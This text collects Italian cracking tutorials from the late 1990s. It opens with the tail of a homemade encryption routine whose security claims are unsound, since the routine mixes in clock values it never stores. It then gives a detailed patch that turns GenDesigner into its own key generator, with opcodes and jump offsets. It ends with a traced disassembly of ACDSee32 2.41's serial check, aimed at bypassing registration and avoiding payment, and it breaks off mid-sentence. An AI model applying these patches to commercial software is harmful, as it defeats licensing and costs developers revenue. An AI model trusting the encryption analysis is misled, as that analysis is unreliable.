mul Random1 
xor ebx, eax 
call GetTickCount 
xor ebx, eax 
mul Random2 
xor ebx, eax 
call GetTickCount 
ror eax, 3 
shr eax, 4 
mov edx, eax 
push edx 
call GetTickCount 
pop edx 
add eax, edx 
xor eax, edx 
xor ebx, eax 
mov dword ptr[buffer+ecx], ebx 
add ecx, 4 
;Qua ci dovete aggiungere un check per vedere le la pass o i byte nel
;buffer sono finiti
jmp algo 

Eccomi, non vi preoccupate, vi commento tutto adess: all'inizio del codice
ECX viene azzerato perche' usato come contatore, poi ci sono queste istruzioni:

mov eax, Random1
mul Random2                           
inc eax

che servono a piazzare un numero casuale in EAX, poi: 
mov ebx, dword ptr[buffer+ecx] 
ror ebx, 4 
shl ebx, 2 
xor ebx, eax 
ror ebx, 4 
shr ebx, 8 
xor ebx, eax 

vengono mossi in ebx i primi 4 byte della password o del file, vengono
rotati a destra di 4, shiftati a sinistra di 2 e poi vengono xorati con
il valore casuale che si trovava in EAX, il risultato viene di nuovo rotato
a destra di 4 shiftato a sinistra di 8 e poi di nuovo xorato con EAX:

call GetTickCount
xor ebx, eax 
mov eax, ebx 
mul Random1 
xor ebx, eax 
call GetTickCount 
xor ebx, eax 
mul Random2 
xor ebx, eax 
call GetTickCount 
ror eax, 3 
shr eax, 4 
mov edx, eax 
push edx 

ed adesso viene chiamata l'API GetTickCount che riporta in EAX i millisecondi
da quando WinPorco e' stato avviato (ed anche questa routine conferisce una
casualita' notevole), i byte vengono quindi xorati con questo valore, EAX
viene poi ancora randomizzata con il primo algoritmo ed i byte vengono ancora
xorati con questo valore random, viene chiamata di nuovo GetTickCount e quindi
i byte vengono ancora xorati con EAX che viene di nuovo randomizzata e usata
per xorare ancora i byte, poi si GetTickCount viene ancora chiamato ma il
risultato stavolta viene randomizzato tramite dei ror e degli shift, quello
che ne esce fuori viene messo in EDX che viene poi salvato:

call GetTickCount
pop edx 
add eax, edx 
xor eax, edx 
xor ebx, eax 
mov dword ptr[buffer+ecx], ebx 
add ecx, 4 
;Qui va il test 
jmp algo 

viene chiamata per l'ultima volta GetTickCount, viene ripreso il valore che
stava in EDX e viene sommato a quello riportato da GetTickCount, la somma di
questi valori viene quindi xorata con EDX ed il risultato xora poi i nostri
cari byte che vengono rimessi a posto, il contatore viene incrisato di una
DWORD e si ricomincia il loop finche' il file non e' finito.
Hehe che bello, ho appena testato questo algo ed e' davvero una meraviglia,
dunque come facciamo a sapere se questo algoritmo e' sicuro? Semplicissimo,
bastano due calcoli, dunque.....ci sono in gioco ben sette numeri molto
casuali, dunque, considerando che possono assumere valori da 00000000 a
FFFFFFFF significa che bisognerebbe indovinare un numero che varia da 0 a
4.294.967.295, ottimo ci sono circa 4 miliardi di combinazioni possibili,
tenendo conto del fatto che i numeri devono essere azzeccati tutti e sette
perche' l'errore anche di un solo byte avrebbe risultati disastrosi sulla
decrittazione, possiamo dire che e' molto difficile indovinarli, considerando
anche che ogni byte viene crittato con sette valori casuali diversi, heheheh,
insomma, fatevi due calcoli e vedrete che anche crittando un file con solo
tre lettere, i risultati di decrittazione sono davvero ma davvero lunghissimi,
pensate solo per tranquillizzarvi che per ogni byte sono possibili
4.294.967.295 di combinazioni per sette volte, quindi elevate quel valore
alla settima e vi renderete conto della sicurezza di quest'algo :)))
  
Ciauz e buona crittazione da Quequero 
Mi raccomando non vi crittate l'hard disk :) 
Note finali  

Saluto tutti i miei amici di #UIC e #crack-it ciauzzzzzzzzzzzz :)))))

Disclaimer 

Qui inserirete con questo carattere il vostro piccolo disclaimer, non e'
obbligatorio pero' e' meglio per voi se c'e'. Dovete scrivere qualcosa di
simile a: vorrei ricordare che il software va comprato e non rubato, dovete
registrare il vostro prodotto dopo il periodo di valutazione. Non mi ritengo
responsabile per eventuali danni causati al vostro computer determinati dal
l'uso improprio di questo tutorial. Questo documento e' stato scritto per
invogliare il consumatore a registrare legalmente i propri programmi, e non
a fargli fare uso dei tantissimi file crack presenti in rete, infatti tale
documento aiuta a comprendere lo sforzo immane che ogni singolo programmatore
ha dovuto portare avanti per fornire ai rispettivi consumatori i migliori
prodotti possibili.
Noi reversiamo al solo scopo informativo e di miglioramento del linguaggio
Assembly.
Capitoooooooo????? Bhe' credo di si ;))))  
------------------------------------------------------------------------------
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ


ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°²²²²°°²²²²°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                Trasformare un programma in un generatore di chiavi
                                      ovvero
                      come rendersi la vita piu' complicata
                                      by +Ma


Certe volte la vita e' gia' abbastanza complicata cosi' com'e', altre volte
invece e' di una semplicita' cosi' disarmante che non ci resta altro da fare
che incasinarcela un po' per conto nostro. La stessa cosa vale per le
protezioni: nonostante si sia gia' speso tanto tempo sulle protezioni del tipo
nome/seriale, certa gente si ostina a salvare il seriale giusto in memoria
giusto di fianco a quello sbagliato... e allora a noi non resta altro da fare
che scervellarci per trovare un crack abbastanza originale. :)

Personalmente, quando lavoro su una protezione, se trovo il seriale bell'e
pronto in memoria mi deprimo: visto che non distribuisco crack, fare una patch
mi pare inutile; il generatore di chiavi? A che mi serve, il seriale e' li' che
mi guarda e mi dice "usami"... e poi la mia pigrizia non me lo permetterebbe
mai! Nonostante tutto, sono riuscito a trovare un modo per rendere un po' piu'
stimolante (almeno x una volta) questa gara vinta in partenza: perche', visto
che sappiamo che il seriale e' li', non istruiamo il programma affinche' ce lo
mostri lui stesso? La cosa piu' bella e' che noi non sappiamo ne' dovremo
imparare assolutamente NULLA sull'algoritmo di codifica della chiave, eppure
avremo un generatore di chiavi perfettamente funzionante! Inoltre, pur non
essendo questa una gran novita', almeno fa una bella scena :)

Vediamo ora come complicarci la vita... 

Il programma su cui ho lavorato io si chiama GenDesigner, la versione poco
importa, dopotutto il programmatore e' un essere umano e non vorra' sbattersi a
cambiare protezione a ogni nuova beta... Ricordate: la LORO vita il piu' delle
volte e' gia' complicata cosi' com'e', per questo sono cosi' prevedibili! :)
Naturalmente, siccome NOI dobbiamo complicarci la vita, VOI sceglierete un
altro programma: l'unica condizione e' che, con un po' di serial fishing, siate
riusciti a trovare la chiave di registrazione in memoria. (un esempio? L'editor
che sto usando adesso, editplus, e' registrato a mio nome grazie a un bel
serialone che ho trovato in memoria...)

La prima domanda che bisogna porsi e': "Ma la chiave sta sempre a quello stesso
indirizzo?". Non sempre, infatti, (anzi, praticamente mai) siamo in grado di
stabilire per essa un indirizzo assoluto di memoria. Il trucco sta tutto nel
riuscire a trovare all'interno del codice uno o piu' punti in cui il programma
accede alla locazione di memoria in cui si e' individuata la chiave. A questo
punto basta vedere come esso accede alla memoria e dove (cioe', in quale
registro) e' salvato l'indirizzo del seriale. Ah... come trovare i riferimenti
all'interno del codice? Semplice, un bel bpr rw (o forse e' meglio anche solo 
un bpr r) sulla locazione di memoria in cui e' memorizzato il seriale... oppure
un po' di zen :)

Nel mio caso, il codice era questo:

:008CEA87  mov edx, dword ptr [ebp-18]    --> woa! Il seriale giusto! :)
:008CEA8A  call 00804010                  --> controlla se e' ok
:008CEA8F  jnz 008CEAC5                   --> jmp pezzente_hai_sbagliato
:008CEA91  mov byte ptr [008e6adc], 01    --> flag: "versione registrata"
:008CEA98  mov eax, 8E6AE0
:008CEA9D  mov edx, dword ptr [ebp-08]    --> indirizzo username

Quando si dice la fortuna, eh... :) subito prima della call che controlla la 
correttezza del mio seriale c'e' un bell'indirizzo che viene salvato in edx...
quello del seriale giusto! Dopo un rapido controllo, vi sara' possibile
verificare che quell'ebp-18 mantiene lo stesso valore anche dopo la call.
Benissimo: quello e' il punto in cui aggiungeremo il codice!

Perche' li'? Beh, intanto e' un punto del programma in cui il seriale giusto e'
gia' stato creato (e scusate se e' poco... ;). Inoltre, subito dopo c'e' un bel
salto giusto/sbagliato che possiamo utilizzare per mostrare il seriale corretto
SOLO se e' stato inserito in precedenza un seriale sbagliato. Ma la domanda che
dobbiamo porci veramente adesso e': come cavolo facciamo? :)

Innanzitutto, decidiamo come visualizzare il seriale. Una messagebox e' forse
la via piu' semplice in assoluto, in quanto richiede pochi parametri fra i
quali, guarda caso, due stringhe che potremo utilizzare per il nome utente e 
per il seriale. La sintassi per chiamare una messagebox e' la seguente:

int MessageBox( 

HWND hWnd, 		// handle della owner window
LPCTSTR lpText, 	// indirizzo del testo della messagebox
LPCTSTR lpCaption, 	// indirizzo del titolo della messagebox
UINT uType 		// stile della messagebox 
); 

Se non avete mai visto niente del genere, forse e' bene dare una studiata alle
API di Windows... su Internet potete trovare delle ottime guide: da un file in
formato help, molto dettagliato, di una dozzina di mega, a versioni in formato
testo o ridotte (con le sole api di interesse x i cracker) che sono in genere
molto piu' piccole (anche sotto i 100k). Forse dovrete anche consultare qualche
tutorial di win32asm, per scoprire che il codice assembly relativo alla 
chiamata sara' del tipo:

PUSH stile_msgbox
PUSH offs_titolo_msgbox
PUSH offs_testo_msgbox
PUSH handle_owner_window
CALL user32.messageboxa

E' bene ricordare che in questo caso l'ordine delle PUSH e' esattamente opposto
a quello utilizzato per passare i parametri. Oltre a questo, diamo per scontate
altre due cose: innanzitutto, lo stile della messagebox sara' quello semplice,
con un singolo pulsante Ok (il che significa che il valore corrispondente sara'
uno zero); inoltre, imposteremo a zero anche l'handle della owner window (si',
avevo detto che ci dovevamo complicare la vita, ma e' sempre meglio non
esagerare!). Ne segue che il codice assembly diventa:

PUSH 00
PUSH offs_titolo_msgbox
PUSH offs_testo_msgbox
PUSH 00
CALL user32.messageboxa

Ok, ora dobbiamo solamente inserire il nome e il numero seriale rispettivamente
come titolo e testo della messagebox. Poiche' essi erano memorizzati nelle
locazioni di memoria puntate da [ebp-08] ed [ebp-18], non ci resta che salvare 
tali valori in un registro e quindi pusharlo. Niente di piu' facile, visto che
abbiamo gia' il codice relativo al registro edx:

:008CEA87  mov edx, dword ptr [ebp-18]    --> woa! Il seriale giusto! :)

e che tale registro viene comunque sovrascritto poche linee dopo:

:008CEA9D  mov edx, dword ptr [ebp-08]    --> indirizzo username

A questo punto, il codice della nostra messagebox diventa cosi':

PUSH 00
MOV  EDX, DWORD PPTR [EBP-08]
PUSH EDX
MOV  EDX, DWORD PPTR [EBP-18]
PUSH EDX
PUSH 00
CALL user32.messageboxa

Woa! La messagebox e' quasi pronta! Ora dobbiamo solo trasformare la chiamata
all'API in una call a un indirizzo, in modo da poterla convertire in opcode...
Per questo ci basta andare a dare un'occhiata in qualche altro punto del
programma, ad esempio cercando dalla finestra delle imported functions di
wdasm tutte le occorrenze di user32.messageboxa. Ad esempio

* Reference To: User32.MessageBoxA, Ord:0000h
                                  |
:00834c89 e84222fdff              call 00806ed0

In gendes ci sono due differenti chiamate a messageboxa, in altri programmi ce
ne sara' piu' probabilmente una sola: guardate l'indirizzo della funzione e
riportatelo pari pari nel vostro codice per la messagebox:

PUSH 00
MOV  EDX, DWORD PPTR [EBP-08]
PUSH EDX
MOV  EDX, DWORD PPTR [EBP-18]
PUSH EDX
PUSH 00
CALL 00806ed0

et voila'... il codice e' pronto! Ora non resta altro da fare che piazzarlo in
un punto della sezione code, sperando che sia inutilizzato... a questo
proposito, date un'occhiata all'inizio del disassemblato:

Disassembly of File: gendes20_b36.exe
Code Offset = 00000400, Code Size = 000DC600
Data Offset = 000DCA00, Data Size = 00007E00

Number of Objects = 0008 (dec), Imagebase = 00800000h

   Object01: CODE     RVA: 00001000 Offset: 00000400 Size: 000DC600 Flags: ...
   Object02: DATA     RVA: 000DE000 Offset: 000DCA00 Size: 00007E00 Flags: ...
   Object03: BSS      RVA: 000E6000 Offset: 000E4800 Size: 00000000 Flags: ...
   Object04: .idata   RVA: 00104000 Offset: 000E4800 Size: 00002A00 Flags: ...
   Object05: .tls     RVA: 00107000 Offset: 000E7200 Size: 00000000 Flags: ...
   Object06: .rdata   RVA: 00108000 Offset: 000E7200 Size: 00000200 Flags: ...
   Object07: .reloc   RVA: 00109000 Offset: 000E7400 Size: 0000E000 Flags: ...
   Object08: .rsrc    RVA: 00117000 Offset: 000F5400 Size: 00056800 Flags: ...

Come potete notare, la sezione CODE ha una dimensione di DC600 byte, a partire
dall'offset 400 all'interno del file. Questo significa che, guardando l'exe
con un editor esadecimale, potremo vedere l'inizio della sezione successiva
all'offset DCA00. Andando a controllare questo indirizzo con il mitico LIST.COM
(IL tool per eccellenza, veloce e soprattutto sotto DOS :) possiamo vedere
quanto segue:

0DC950  65 73 69 67 6E 65 72 2E 68 6C 70 00 00 00 00 00
0DC960  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC970  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC980  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC990  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC9A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC9B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC9C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC9D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC9E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DC9F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0DCA00  32 13 8B C0 02 00 8B C0 00 8D 40 00 00 00 00 00

Wow! Che fortuna!!! Alla fine della sezione CODE abbiamo un casino di spazio
libero! Tutti quelli zeri sono li' a nostra disposizione, giusto per farci
inserire il codice della messagebox! Si', lo so... e' troppo facile: chi fra di
voi lo desidera, puo' aggiungere una sezione all'exe e prendersi tutto lo
spazio che vuole :)

A questo punto, non ci resta altro da fare che inserire gli opcode giusti al
posto giusto, quindi deviare l'esecuzione del programma dall'indirizzo in cui
ci trovavamo (si era deciso di inserire il codice all'altezza dell'istruzione
di salto, all'indirizzo 8CEA8F)... per questo dobbiamo scegliere innanzitutto
un indirizzo da cui partire per inserire il codice. In realta' qualsiasi voi
scegliate a partire dal secondo zero dopo la fine del codice puo' andare bene
(il secondo, poiche' il primo potrebbe essere un terminatore di stringa, chi
lo sa...), anche se per un vantaggio estetico molti sceglieranno 0DC960 ;)
Un vantaggio collaterale di questa scelta sta nel fatto che vengono lasciati
abbastanza zeri dall'ultima "istruzione" (o almeno come tale la interpreta il
nostro vecchio disassemblatore) per permettere a wdasm di disassemblare il 
nostro codice nel modo corretto.

Per questo motivo... io scegliero' 0DC962! Ehehe... no, questa volta non e' per
complicarvi nuovamente la vita, fra poco capirete il motivo di questa mia
scelta... nel frattempo, guardate come dovrebbe essere il codice:

:008dd562 6a00                    push 00
:008dd564 8b55f8                  mov edx, dword ptr [ebp-08]
:008dd567 52                      push edx
:008dd568 8b55e8                  mov edx, dword ptr [ebp-18]
:008dd56b 52                      push edx
:008dd56c 6a00                    push 00

* Reference To: User32.MessageBoxA, Ord:0000h
                                  |
:008dd56e e85d99f2ff              call 00806ed0
:008dd573 e94d15ffff              jmp 008ceac5        --> Torna alla normale
                                                          esecuzione del prog

Tutto e' abbastanza lineare: semplicemente dovete tener presente il fatto che
la call e il salto sono relativi, quindi per stabilire l'operando esatto da
aggiungere agli opcode E8 ed E9, rispettivamente:

806ed0-8dd573=fff2995d            --> Girato = 5d99f2ff
8ceac5-8dd578=ffff154d            --> Girato = 4d15ffff

(Regola molto semplice: per trovare l'indirizzo destinazione dovete sottrarre
 a quest'ultimo l'indirizzo dell'istruzione successiva a quella di partenza.)

A questo punto, abbiamo il codice bell'e pronto da utilizzare... non ci resta
altro da fare che reindirizzare il salto dell'errore (il solito, quello che si
trova all'indirizzo 8CEA8F) all'inizio della nostra porzione di codice, cioe'
a 8dd562. Ma... kaz, non ci avevamo pensato! Il salto da fare e' LUNGO, quindi
non possiamo aspettarci una sostituzione indolore: infatti, esso non richiede
solo 2 byte ma ne vuole addirittura 5, l'esoso... come se non bastasse, il 
codice

:008CEA8F 7534                    jnz 008CEAC5
:008CEA91 C605DC6A8E0001          mov byte ptr [008e6adc], 01

e' anche abbastanza importante, perche' la seconda istruzione (quella, cioe',
che noi cancelleremmo con il nuovo salto) e' quella che imposta il flag di
"registrato" se il seriale e' giusto. Beh, una soluzione ci sarebbe... possiamo
far eseguire il nostro salto lungo (che sara' un salto incondizionato) un paio
di byte prima e inserire all'inizio del nostro codice un salto condizionato 
analogo a quello che cancelliamo: tale salto portera' alla fine della nostra 
porzione di codice, dove verra' copiata l'istruzione che abbiamo sovrascritto
e, dopo di essa, un salto che ci riporti alla normale esecuzione del programma.
Ehmmm... forse e' meglio che spieghi poco per volta... O:)

Diamo per persa l'istruzione all'indirizzo 8CEA91: dove possiamo reinserirla?
Alla fine della nostra porzione di codice, dove un salto condizionato che noi
inseriremo all'inizio, all'indirizzo 8DD560 (ve l'avevo detto che c'era un
motivo per la mia scelta!), ci portera' senza nessun problema. In pratica, il
nostro codice sara' cosi':

:008dd560 7416                    je 8dd578     --> Salta se e' tutto ok,
                                                    prosegui se il seriale
                                                    e' sbagliato
:008dd562 qui comincia il nostro codice...
:008dd573 qui finisce  il nostro codice...

:008dd578 c605dc6a8e0001          mov byte ptr [008e6adc], 01
:008dd57f e91415ffff              jmp 008cea98

Questo e' possibile in quanto il flag Z si conserva senza problemi dopo il
salto incondizionato. A questo punto, non ci resta altro da fare che 
sostituire le due istruzioni che a partire dall'indirizzo 8cea8f con:

:008cea8f e9ccea0000              jmp 008dd560
:008cea94 90                      nop
:008cea95 90                      nop
:008cea96 90                      nop
:008cea97 90                      nop

... e il nostro programma e' stato trasformato in un generatore di chiavi. :)

***************   CONCLUSIONI   ***************

Come avete potuto notare, l'aggiunta di codice all'interno di un programma non
e' un'operazione cosi' terribile... anzi, una volta imparato il meccanismo vi
sorprenderete per quanto radicali siano le modifiche che potrete fare con poco
sforzo. A questo punto, sbizzarritevi: create crack piu' originali, aggiungete
funzionalita' ai vostri programmi, fate in modo che le applicazioni facciano
quello che volete voi! Se avete domande o suggerimenti, o se volete portare
avanti qualche progetto di "modifica estrema", fatemelo sapere all'indirizzo
email malattia@gmx.net, oppure venitemi a cercare su ircnet, #crack-it.

*************   RINGRAZIAMENTI   **************

Un ringraziamento a tutti i compagni di RingZero che contribuiscono alla scena
cracking italiana (e, presto, mondiale) come mai avrei sperato. Un grazie va
in particolare a 

Neuro, senza l'appoggio del quale questo tute probabilmente non sarebbe stato 
       neanche scritto
Pusillus, che ha sopportato i miei deliri sull'aggiunta di sezioni alle dll di
          winamp ;))
Genius, che mi ha strabiliato con la piu' bella realizzazione possibile di un
        progetto che, se fosse dipeso solo dal sottoscritto, sarebbe rimasto 
        irrealizzato ancora per molti anni :)
xERHOD, che in poco tempo ci ha aiutato piu' di quanto io abbia fatto in anni
        con RingZero e HCU messi assieme... resta sempre cosi'!
Chillecs e Csoa, perche' esistono (e scusate se e' poco ;)
Babbo Natale, perche' mi porta dei regali tutti gli anni 
Tutti i ragazzi di #crack-it che mi fanno sempre passare delle ore divertenti
... e mi fanno spendere miliardi di bolletta :)

@1999, .+MaLaTTiA.

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                   ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                   ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                   ÷³     ACDSEE32 2.41 CRACKING     ³÷
                   ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                   ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Autore: cod
Oggetto: ACDSee32 2.41
Difficolt…: Media (seriale rompipalle!)

Musica ascoltata: Marilyn Manson - Mechanical Animals

L'oggetto di questo articolo come avrete gi… letto in alto  ACDSee32.
Tutto il codice che sar… visualizzato nell'articolo  della versione 2.41,
quindi qualora sia uscita una nuova versione di questo software gli indirizzi
qui inseriti saranno tutti errati. Ma comunque la routine che controlla
il seriale  sempre la stessa.

ACDSee  un eccellente software per la visualizzazione di file grafici.

Avviamo ACDSee  incominciamo ad usarlo... per un p• di tempo (sino a 30g
dopo l'installazione) vi ricorder… di tanto in tanto che il software non
 registrato.. superati i 30g questo ricordo sar… pi— visibile... diciamo
1 volta ogni 20-30 immagini visualizzate... qui la cosa diventa un p•
fastidiosa... quindi andiamo col nostro mouse sul pulsante Register now del
NAG Screen che comparir….

Prima per• di procedere diamo un p• lo sguardo all'help per vedere quanto
ci costa questo software.... $ 40 da spedire negli USA (e getta) nel miglior
modo che crediamo... io credo che il migliore sia tenersi i $ 40 e starsene
buoni a casa.

PREMETTO INNANZITUTTO CHE NON MI ASSUMO NESSUNA RESPONSABILITA' SULL'USO
CHE FARETE DI QUESTO ARTICOLO... NE PER MANCATI PROFITTI CAUSATI ALL'ACD
System...

L'ideale sarebbe scrivere un bel generatore di chiavi... ma dobbiamo sapere
che la nostra ACDSystem ha avuto la bella idea di controllare che i codici
inseriti non siano di versioni precedenti... il che significa che ad ogni
nuova versione bisogner… fare un nuovo generatore! Quindi scordatevelo!!

Di cosa abbiamo bisogno:
SoftICE 3.xx, ma personalmente sto usando la 4.0
Un disassemblatore... W32 Disassembler 8.93 va pi— che bene.. ma sinceramente
preferisco IDA 3.8 dato che  pi— utile... infatti tutto il codice che
riporter• in seguito sar… ricavato tramite questo disassemblatore.
Un editor esadecimale... Hacker's View 6.xx va benissimo!
ACDSee 2.41! L'avete si o no ? Se si va bene se no ve lo scaricate da
www.acdsee.com o senn• lo prendete in edicola in qualsiasi giornale!

Ora inseriamo nel modulo di registrazione il nostro nome e il nostro numero
seriale.... io personalmente ho usato Antonio e n. s. 666
Voi metteteci quello che vi pare... clickiamo sul pulsante OK e cosa ci dice?
Codice errato... cazzo... ma se vi dovesse dire codice esatto avete un culo
talmente enorme che manco ve lo immaginate!!!

Ora premiamo CTRL+D e ci compare il nostro bel SoftICE e settiamo un bel
breakpoint sulla funzione GetDlgItemTextA...
nel caso vi dice che questo simbolo non  definito dovete uscire da Windows
e modificare WINICE.DAT inserendo le righe EXP=nomepercorso\nomefile.dll...
ma in ogni caso troverete quelle che vi interessano (KERNEL32.DLL USER32.DLL
e chi ne ha ne metta) semplicemente disabilitate con un ; davanti... quindi
toglietelo!

Clickate di nuovo sul pulsante OK e vi trovere magnificamente dentro SoftICE,
premete il tasto F12 evi ritroverete nel codice di ACDSee32...
Ora rimuovete i breakpoint con BC * e procedete STEP TO STEP.

Proseguendo avanti nel programma noteremo altre CALL al KERNEL tra cui
qualcuna nel registro... non fateci caso e state attenti a non cadere nella
trappola.... infatti una di queste CALL sar… quella fatale!

Giungerete in un punto del programma in cui sar… fatta una CALL alla locazione
458160... qui incomincia la parte pi— bella.... premete F8 e steppate dentro
la funzione.

Ecco un p• di codice assembler per chiarirvi le idee:

00458160 sub_458160      proc near
00458160 
00458160 var_24          = dword ptr -24h         ; Variabili usate dal
00458160 var_20          = byte ptr -20h          ; programma.
00458160 arg_0           = dword ptr  4           ; Nome
00458160 arg_4           = dword ptr  8           ; Seriale
00458160 arg_8           = dword ptr  0Ch         ; ?? BOOOOO
00458160 
00458160                 sub     esp, 24h         ; Non fateci caso.. sono
00458163                 push    ebx              ; per garantire i passaggi
00458164                 push    ebp              ; parametri!
00458165                 push    esi              ;
00458166                 mov     esi, [esp+30h+arg_0] ; ESI -> Punta al nome
0045816A                 push    edi              ; Salva EDI 
0045816B                 mov     edi, ecx         ; ECX = 50003A
0045816D                 push    esi              ; ESI -> Nome
0045816E                 mov     [esp+38h+var_24], edi ; Salva in VAR_24 ECX

Ecco qui abbiamo un'altra CALL su cui porre la nostra attenzione... infatti
se andrete a fare il trace di questa funzione noterete che il programma
controlla il vostro nome alla ricerca di eventuali spazi... fino a che non
incontra la fine della stringa... e successivamente far… un controllo sulla
lunghezza del nome... e ritorner… il valore 0 nel caso il nome inserito
sia minore di 5 mentre ritorner… 1 se  uguale a 5 o  maggiore!
00458172                 call    sub_459DB0       ; CheckName(ESI)
00458177                 add     esp, 4           ;
0045817A                 test    eax, eax         ; Se EAX != 0
0045817C                 jnz     short loc_45818A ; salta a 45818A

0045817E loc_45817E:     ; Qui termina con 0 ovvero errore!
........                 ;
00458187                 ; Usate nomi da 5 o pi— lettere!

0045818A loc_45818A:                              ; EAX assume l'indirizzo
0045818A                 lea     eax, [esp+34h+var_20] ; di var_20
0045818E                 push    1                ; Una variabile che sar…
00458190                 push    eax              ; a 1
00458191                 push    esi              ; ESI -> Nome
00458192                 call    sub_45A0F0       ; Converte il nome(vedi sub)
La sub_45A0F0 convertit… il nome in caratteri maiuscoli e quindi sia Antonio
che ANTONIO hanno lo stesso numero seriale...

00458197                 mov     eax, [edi+20h]   ; EDI=50003A + 20h
                                                  ; EAX punta alla seguente
                                                  ; stringa:
                                                  ; -314159265
0045819A		 add	 esp, 0Ch

0045819D                 cmp     byte ptr [eax], 2Dh ; '-' == '-'  
004581A0                 jnz     loc_458240       ; Se no salta a 458240
004581A6                 mov     ecx, [esp+34h+arg_8] ; ECX = 0
004581AA                 mov     ebx, [esp+34h+arg_4] ; EBX = Seriale
004581AE                 push    ecx              ; 0
004581AF                 push    ebx              ; Seriale
004581B0                 push    esi              ; Nome
004581B1                 push    eax              ; -314159265
004581B2                 call    sub_459DF0       ; VERIFICA IL SERIALE!
Bene siamo giunti a questa funzione... la sub_459DF0... questa la dovremmo
proprio controllare in quanto da essa viene stabilito se il programma ha
un codice seriale esatto o no... quindi premte F8!


00459DF0 sub_459DF0      proc near

00459DF0 var_84          = byte ptr -84h          ; Variabili... 
00459DF0 var_58          = byte ptr -58h          ;
00459DF0 var_2C          = byte ptr -2Ch          ;
00459DF0 arg_0           = dword ptr  4           ; Codice '-ecc....'
00459DF0 arg_4           = dword ptr  8           ; Nome
00459DF0 arg_8           = dword ptr  0Ch         ; Seriale
00459DF0 arg_C           = dword ptr  10h         ; 0

00459DF0                 mov     ecx, [esp+arg_4] ; 
00459DF4                 sub     esp, 84h         ;
00459DFA                 lea     eax, [esp+84h+var_84] 
00459DFE                 push    esi              ; Ok... qui evito di
00459DFF                 push    edi              ; commentare il tutto
00459E00                 push    1                ; in quanto fa ulteriori
00459E02                 push    eax              ; check sul seriale ma ci•
00459E03                 push    ecx              ; che a noi interessa e
00459E04                 call    sub_45A0F0       ; bypassare questa funzione
00459E09		 lea	 edi, [esp+98h+var_84]
00459E0D                 or      ecx, 0FFFFFFFFh  ; affinch noi possiamo aver
00459E10                 xor     eax, eax         ; registrato il programma
00459E12                 add     esp, 0Ch         ; con qualsiasi numero....
00459E15                 repne scasb              ;
00459E17                 not     ecx              ;
00459E19                 dec     ecx              ;
00459E1A                 mov     eax, 2AAAAAABh   ;
00459E1F                 mov     esi, ecx         ;
00459E21                 imul    esi              ;
00459E23                 mov     eax, edx         ;
00459E25                 shr     eax, 1Fh         ;
00459E28                 lea     edi, [edx+eax+1] ;
00459E2C                 xor     edx, edx         ;
00459E2E                 test    esi, esi         ;
00459E30                 jle     short loc_459E43 ;
00459E32                 xor     eax, eax         ;
                                                  ;
00459E34 loc_459E34:                              ;
00459E34		 mov	 cl, [esp+eax+8Ch+var_84]
00459E38                 add     eax, edi         ;
00459E3A                 mov     [esp+edx+8Ch+var_58], cl
00459E3E                 inc     edx              ;
00459E3F                 cmp     eax, esi         ;
00459E41                 jl      short loc_459E34 ;
                                                  ;
00459E43 loc_459E43:                              ;
00459E43		 mov	 eax, [esp+8Ch+arg_8]
00459E4A		 mov	 ecx, [esp+8Ch+arg_0]
00459E51		 mov	 [esp+edx+8Ch+var_58], 0
00459E56		 lea	 edx, [esp+8Ch+var_2C]
00459E5A                 push    29h              ; ECCO!!! FERMIAMOCI QUI
00459E5C                 push    edx              ; IL VALORE RESTITUITO 
00459E5D                 push    eax              ; DALLA CALL SUCCESSIVA
00459E5E                 push    ecx              ; E' IMPORTANTE !!
00459E5F                 call    sub_459EE0       ;
00459E64		 mov	 ecx, [esp+9Ch+arg_C]
00459E6B                 add     esp, 10h         ;
00459E6E                 test    ecx, ecx         ; Controlla ECX... ma
00459E70                 jl      short loc_459E81 ; il nostro ECX  0
00459E72                 cmp     eax, ecx         ; ed EAX non  uguale a ECX
Questo confronto tra eax ed ecx  un punto importante... noterete che
